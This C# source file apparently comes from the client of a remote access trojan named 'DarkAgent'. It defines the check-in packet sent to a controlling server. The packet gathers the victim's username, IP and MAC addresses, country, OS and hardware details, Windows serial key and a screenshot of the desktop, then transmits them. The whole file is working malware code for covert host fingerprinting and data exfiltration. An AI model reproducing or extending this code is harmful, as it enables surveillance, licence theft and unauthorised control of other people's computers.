using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using DarkAgent_Client.src.Utils;
using DarkAgent_Client.src.Engines;
using System.Management;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Drawing;
using System.IO;
using System.Drawing.Imaging;
using System.Drawing.Drawing2D;
using DarkAgent_Client.src.Objects;
using System.Windows.Forms;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Send
{
    class S_NewClient : SendBasePacket
    {
        public S_NewClient(ClientConnect client)
            : base(client)
        {
        }

        protected internal override void Write()
        {
            WriteByte(0); //Packet Id
            WriteString("Client");
            WriteString(GetCountry.Country());
            WriteBytes(Dns.GetHostByName(Dns.GetHostName()).AddressList[0].GetAddressBytes());
            WriteString(WindowsIdentity.GetCurrent().Name.Split('\\')[1]);
            WriteString(WMI.ReadString("CSName", "CIM_OperatingSystem", null));
            WriteString(WMI.ReadString("Caption", "CIM_OperatingSystem", null));
            WriteInteger(WMI.ReadInteger("BuildNumber", "CIM_OperatingSystem", null));
            WriteString(WMI.ReadString("OSArchitecture", "CIM_OperatingSystem", null));
            WriteString(WMI.ReadString("CSDVersion", "CIM_OperatingSystem", null));
            WriteString(WMI.ReadString("RegisteredUser", "CIM_OperatingSystem", null));
            WriteString(WinSerial.GetSerial());
            WriteString(WMI.ReadString("SystemDirectory", "CIM_OperatingSystem", null));
            WriteString(WMI.ReadString("SystemDrive", "CIM_OperatingSystem", null) + "\\");
            WriteString(string.Format("{0} GB", WMI.ReadInteger("TotalVisibleMemorySize", "CIM_OperatingSystem", null) / 1000000));
            WriteString(WMI.ReadString("Name", "CIM_Processor", null));

            string MacAddress = "";
            try
            {
                ManagementObjectSearcher objOS = default(ManagementObjectSearcher);
                objOS = new ManagementObjectSearcher("select MACAddress, IPEnabled from Win32_NetworkAdapterConfiguration");
                foreach (ManagementBaseObject objMgmt in objOS.Get())
                {
                    if (objMgmt["IPEnabled"].ToString() == "True")
                        MacAddress += objMgmt["MACAddress"].ToString() + ", ";
                }
            }catch{}

            WriteString(MacAddress);
            WriteString(Program.RatVersion);
            WriteBytes(BitmapToBytes(ScreenCapture.resizeImage(ScreenCapture.CaptureScreen(), new Size(120, 120))));
            WriteShort((short)(Screen.PrimaryScreen.Bounds.Width));
            WriteShort((short)(Screen.PrimaryScreen.Bounds.Height));
        }

        private byte[] BitmapToBytes(Bitmap image)
        {
            MemoryStream stream = new MemoryStream();
            image.Save(stream, ImageFormat.Jpeg);
            byte[] Bytes = stream.GetBuffer();
            image.Dispose();
            stream.Close();
            WriteShort((short)Bytes.Length);
            return Bytes;
        }
    }
}
